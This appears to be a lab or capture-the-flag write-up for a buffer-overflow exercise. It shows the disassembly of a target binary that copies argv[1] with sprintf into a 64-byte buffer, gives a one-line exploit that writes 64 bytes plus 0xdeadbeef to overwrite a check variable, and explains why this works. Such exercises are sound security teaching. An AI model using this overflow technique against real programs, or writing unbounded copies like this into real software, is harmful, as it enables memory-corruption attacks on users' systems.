# ex05 - Overwrite a target variable with argv

## Goal
Print `you have hit the target correctly :)`.

## Relevant assembly (`vuln`)
```asm
080483f4: push ebp
080483f5: mov  ebp,esp
080483f7: sub  esp,0x68
080483fa: mov  DWORD PTR [ebp-0xc],0x0     ; target cookie
08048401: mov  eax,DWORD PTR [ebp+0x8]       ; argv[1]
08048404: mov  DWORD PTR [esp+0x4],eax
08048408: lea  eax,[ebp-0x4c]               ; 64-byte destination buffer
0804840b: mov  DWORD PTR [esp],eax
0804840e: call sprintf                       ; unsafe copy
08048413: mov  eax,DWORD PTR [ebp-0xc]      ; cookie
08048416: cmp  eax,0xdeadbeef
0804841b: jne  ...
```

## Exploit
```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
```

## Why it works
`sprintf` copies `argv[1]` into a 64-byte buffer with no limit. The 64 bytes reach `target` at `[ebp-0xc]`; the next 4 bytes overwrite it with `0xdeadbeef`.


